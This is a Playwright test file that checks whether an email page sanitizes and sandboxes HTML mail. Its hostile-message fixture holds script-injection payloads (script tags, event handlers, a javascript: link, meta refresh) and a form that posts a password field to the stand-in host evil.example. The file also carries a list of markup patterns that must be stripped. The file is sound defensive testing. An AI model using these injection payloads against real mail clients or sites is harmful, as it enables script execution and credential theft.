import { expect, test, type Page, type Route } from '@playwright/test'
import { seedBreakGlassSession } from './helpers/auth-seed'

/**
 * email-html-render.spec.ts: the Email page renders HTML mail safely.
 *
 * Mocks `/api/email` with `page.route` (pattern from mail-safety-card.spec.ts).
 *
 * EH-1  HTML renders inside an iframe whose sandbox has no allow-scripts,
 *       allow-same-origin or allow-forms.
 * EH-2  Hostile markup is removed (script, onerror, javascript: href, form,
 *       iframe, meta refresh, base, link); nothing executes.
 * EH-3  Remote images / CSS url() / tracking pixels are not requested by
 *       default, the CSP allows only data:/cid: images, and "Load images"
 *       (per message) then allows them.
 * EH-4  Links open in a new tab with rel=noopener noreferrer nofollow.
 * EH-5  "View as plain text" swaps to the readable text and back.
 * EH-6  Plain-only mail has no iframe. Frame auto-sizes, wraps, themes.
 */

const TRACKER = 'https://tracker.example/pixel.gif?u=owner'
const REMOTE_IMG = 'https://cdn.example/banner.png'
const BG_URL = 'https://cdn.example/bg.png'

const HOSTILE_HTML = `<!doctype html><html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/x.css">
<style>.hero{background:url(${BG_URL})} @import url(https://evil.example/i.css); p{color:#333}</style>
<script>window.parent.__pwned = 1; document.title='pwned'</script></head>
<body onload="window.__pwned=2">
<h1>Your <em>receipt</em></h1>
<p class="hero" style="background-image:url('${BG_URL}')">Thanks for shopping.</p>
<p><a id="good" href="https://shop.example/order/1">View order</a>
<a id="evil" href="javascript:window.__pwned=3">Click me</a></p>
<img src="${TRACKER}" width="1" height="1" onerror="window.__pwned=4">
<img src="${REMOTE_IMG}" alt="banner" srcset="${REMOTE_IMG} 2x">
<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="inline">
<form action="https://evil.example/post" method="post"><input name="pw"><button>Send</button></form>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/o"></object><embed src="https://evil.example/e">
<svg onload="window.__pwned=5"><script>1</script></svg>
<p>${'averyveryveryverylongunbrokenwordthatmustwrap'.repeat(8)}</p>
</body></html>`

function thread(id: string, subject: string, body: string) {
  return {
    thread_id: id,
    from_address: 'shop@vendor.example',
    to_address: 'me@example.com',
    sender_name: 'Vendor',
    subject,
    message_count: 1,
    unread: 0,
    last_body: body,
    last_direction: 'RECEIVED',
    last_timestamp: '2026-11-01T10:00:00Z',
    attention_id: null,
  }
}

const THREADS = [
  thread('thr-html', 'Your receipt', 'Your receipt Thanks for shopping.'),
  thread('thr-plain', 'Plain note', 'Just words.'),
  thread('thr-long', 'Long newsletter', 'Long'),
]

function detail(id: string, body: string, bodyHtml: string | null) {
  const t = THREADS.find((x) => x.thread_id === id)!
  return {
    thread: t,
    messages: [
      {
        message_id: `m-${id}`,
        thread_id: id,
        direction: 'RECEIVED',
        from_address: 'shop@vendor.example',
        to_address: 'me@example.com',
        subject: t.subject,
        body,
        body_html: bodyHtml,
        timestamp: '2026-11-01T10:00:00Z',
      },
    ],
  }
}

const LONG_HTML =
  '<html><body>' +
  Array.from({ length: 60 }, (_, i) => `<p>Paragraph ${i} of a long newsletter.</p>`).join('') +
  '</body></html>'

const DETAILS: Record<string, unknown> = {
  'thr-html': detail('thr-html', 'Your receipt\n\nThanks for shopping.', HOSTILE_HTML),
  'thr-plain': detail('thr-plain', 'Just words, no markup.', null),
  'thr-long': detail('thr-long', 'Long', LONG_HTML),
}

interface Capture {
  remote: string[]
  dialogs: string[]
}

async function setup(page: Page): Promise<Capture> {
  const cap: Capture = { remote: [], dialogs: [] }
  page.on('dialog', (d) => {
    cap.dialogs.push(d.message())
    void d.dismiss()
  })
  page.on('request', (req) => {
    const u = new URL(req.url())
    if (u.hostname.endsWith('.example')) cap.remote.push(req.url())
  })
  // Remote hosts would never resolve; answer so "allowed" loads are observable.
  await page.route(/https:\/\/(tracker|cdn|evil)\.example\/.*/, (route: Route) =>
    route.fulfill({
      status: 200,
      contentType: 'image/gif',
      body: Buffer.from('R0lGODlhAQABAAAAACw=', 'base64'),
    }),
  )
  await page.route('**/api/email/**', (route: Route) => {
    const id = route.request().url().split('/api/email/')[1]?.split('?')[0] ?? ''
    return route.fulfill({
      status: id in DETAILS ? 200 : 404,
      contentType: 'application/json',
      body: JSON.stringify(DETAILS[id] ?? { detail: 'not found' }),
    })
  })
  await page.route('**/api/email', (route: Route) =>
    route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify({ data: THREADS, meta: {} }),
    }),
  )
  await seedBreakGlassSession(page)
  await page.goto('/email', { waitUntil: 'domcontentloaded' })
  await expect(page.locator('main h1')).toHaveText('Email')
  return cap
}

async function open(page: Page, subject: string) {
  await page.getByRole('button', { name: new RegExp(subject) }).click()
}

test.describe('Email HTML rendering', () => {
  test('EH-1 sandboxed iframe without scripts, same-origin or forms', async ({ page }) => {
    await setup(page)
    await open(page, 'Your receipt')
    const frame = page.getByTestId('email-html-frame')
    await expect(frame).toBeVisible()
    const sandbox = (await frame.getAttribute('sandbox')) ?? ''
    expect(sandbox).not.toContain('allow-scripts')
    expect(sandbox).not.toContain('allow-same-origin')
    expect(sandbox).not.toContain('allow-forms')
    expect(await frame.getAttribute('srcdoc')).toBeTruthy()
    // Rendered, readable content (not escaped markup).
    const inner = page.frameLocator('[data-testid="email-html-frame"]')
    await expect(inner.locator('h1')).toContainText('Your receipt')
    await expect(inner.locator('body')).not.toContainText('<h1>')
  })

  test('EH-2 hostile markup is stripped and nothing executes', async ({ page }) => {
    const cap = await setup(page)
    await open(page, 'Your receipt')
    const srcdoc = (await page.getByTestId('email-html-frame').getAttribute('srcdoc')) ?? ''
    const body = srcdoc.slice(srcdoc.indexOf('<body>'))
    for (const needle of [
      '<script', 'onerror', 'onload', 'onclick', 'javascript:', '<form', '<input',
      '<iframe', '<object', '<embed', '<svg', '<base', '<link', 'http-equiv="refresh"',
      '@import', 'evil.example',
    ]) {
      expect(body.toLowerCase(), `body must not contain ${needle}`).not.toContain(needle.toLowerCase())
    }
    // The only meta http-equiv is our CSP.
    expect((srcdoc.match(/http-equiv="/g) ?? []).length).toBe(1)
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined()
    expect(cap.dialogs).toEqual([])
    expect(cap.remote.filter((u) => u.includes('evil.example'))).toEqual([])
  })

  test('EH-3 remote content blocked by default, allowed per message after Load images', async ({ page }) => {
    const cap = await setup(page)
    await open(page, 'Your receipt')
    const frame = page.getByTestId('email-html-frame')
    await expect(page.getByTestId('remote-content-banner')).toContainText('Remote content blocked')
    let srcdoc = (await frame.getAttribute('srcdoc')) ?? ''
    expect(srcdoc).toContain("default-src 'none'")
    expect(srcdoc).toContain("style-src 'unsafe-inline'")
    expect(srcdoc).toContain('img-src data: cid:;')
    expect(srcdoc).not.toContain('tracker.example')
    expect(srcdoc).not.toContain('cdn.example')
    expect(srcdoc).toContain('color:#333') // <head><style> rules survive
    expect(srcdoc).toContain('data:image/gif;base64')
    await page.waitForTimeout(300)
    expect(cap.remote).toEqual([])

    await page.getByRole('button', { name: 'Load images' }).click()
    await expect(page.getByTestId('remote-content-banner')).toHaveCount(0)
    srcdoc = (await frame.getAttribute('srcdoc')) ?? ''
    expect(srcdoc).toContain('img-src data: cid: https:')
    expect(srcdoc).toContain(TRACKER)
    expect(srcdoc).not.toContain('<script')
    await expect.poll(() => cap.remote.some((u) => u.includes('tracker.example'))).toBe(true)
    // Only https is allowed, and nothing active came back with it.
    expect(srcdoc).not.toMatch(/http:\/\//)
    expect(srcdoc).not.toContain('evil.example')

    // Choice is per message and not persisted: another thread then back.
    await open(page, 'Plain note')
    await open(page, 'Your receipt')
    await expect(page.getByTestId('remote-content-banner')).toBeVisible()
  })

  test('EH-4 links open in a new tab with noopener noreferrer nofollow', async ({ page }) => {
    await setup(page)
    await open(page, 'Your receipt')
    const inner = page.frameLocator('[data-testid="email-html-frame"]')
    const good = inner.locator('a#good')
    await expect(good).toHaveAttribute('target', '_blank')
    await expect(good).toHaveAttribute('rel', 'noopener noreferrer nofollow')
    await expect(good).toHaveAttribute('href', 'https://shop.example/order/1')
    await expect(inner.locator('a#evil')).not.toHaveAttribute('href', /.+/)
  })

  test('EH-5 View as plain text toggles to readable text and back', async ({ page }) => {
    await setup(page)
    await open(page, 'Your receipt')
    await page.getByRole('button', { name: 'View as plain text' }).click()
    await expect(page.getByTestId('email-html-frame')).toHaveCount(0)
    await expect(page.getByTestId('email-body-text')).toContainText('Thanks for shopping.')
    await page.getByRole('button', { name: 'View formatted' }).click()
    await expect(page.getByTestId('email-html-frame')).toBeVisible()
  })

  test('EH-6 plain-only mail has no iframe and no toggle', async ({ page }) => {
    await setup(page)
    await open(page, 'Plain note')
    await expect(page.getByText('Just words, no markup.')).toBeVisible()
    await expect(page.getByTestId('email-html-frame')).toHaveCount(0)
    await expect(page.getByRole('button', { name: 'View as plain text' })).toHaveCount(0)
  })

  test('EH-7 frame auto-sizes to content and long words wrap (no inner scroll)', async ({ page }) => {
    await setup(page)
    await open(page, 'Long newsletter')
    const frame = page.getByTestId('email-html-frame')
    await expect.poll(async () => (await frame.boundingBox())?.height ?? 0).toBeGreaterThan(600)
    await open(page, 'Your receipt')
    const inner = page.frameLocator('[data-testid="email-html-frame"]')
    await expect(inner.locator('h1')).toBeVisible()
    await expect.poll(async () => (await page.getByTestId('email-html-frame').boundingBox())?.height ?? 0).toBeGreaterThan(80)
    const overflow = await inner.locator('body').evaluate((b) => b.scrollWidth - b.clientWidth)
    expect(overflow).toBeLessThanOrEqual(1)
  })

  test('EH-8 readable in dark theme (neutral light surface, dark text)', async ({ page }) => {
    await setup(page)
    await page.evaluate(() => document.documentElement.classList.add('dark'))
    await open(page, 'Your receipt')
    const inner = page.frameLocator('[data-testid="email-html-frame"]')
    const colors = await inner.locator('body').evaluate((b) => {
      const cs = getComputedStyle(b)
      return { bg: cs.backgroundColor, fg: cs.color }
    })
    expect(colors.bg).toBe('rgb(255, 255, 255)')
    expect(colors.fg).toBe('rgb(31, 41, 55)')
  })
})
